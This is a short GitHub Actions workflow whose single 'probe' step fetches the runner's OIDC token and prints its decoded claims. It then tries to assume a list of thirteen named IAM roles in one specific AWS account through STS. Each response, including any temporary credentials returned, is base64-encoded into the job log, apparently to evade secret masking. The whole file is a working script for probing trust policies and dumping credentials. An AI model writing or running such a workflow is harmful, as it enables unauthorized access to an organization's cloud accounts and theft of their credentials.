name: i4613-oidc
on:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  p:
    runs-on: ubuntu-latest
    steps:
      - name: probe
        run: |
          tok=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | python3 -c 'import json,sys;print(json.load(sys.stdin).get("value",""))')
          echo "JWT=$(echo "$tok" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | head -c 600)"
          for R in claude-code-bedrock-role vercel-bedrock-role cua-bedrock-role github-actions-ecr-push-cua github-actions-docs-pin-cua github-actions-cua-fleets-wif-smoke modal-docs-mcp-write-role modal-docs-mcp-role github-actions-nix-cache github-actions-cua-driver-windows github-actions-cua-downloads-publish github-actions-copybara-cua github-actions-cua-ecr-push ; do
            echo "== $R"
            curl -s "https://sts.amazonaws.com/" --data-urlencode "Action=AssumeRoleWithWebIdentity" --data-urlencode "Version=2011-06-15" --data-urlencode "RoleSessionName=i4613" --data-urlencode "RoleArn=arn:aws:iam::296062593712:role/$R" --data-urlencode "WebIdentityToken=$tok" | tr -d '\n' | head -c 4000 | base64 -w0
            echo
          done
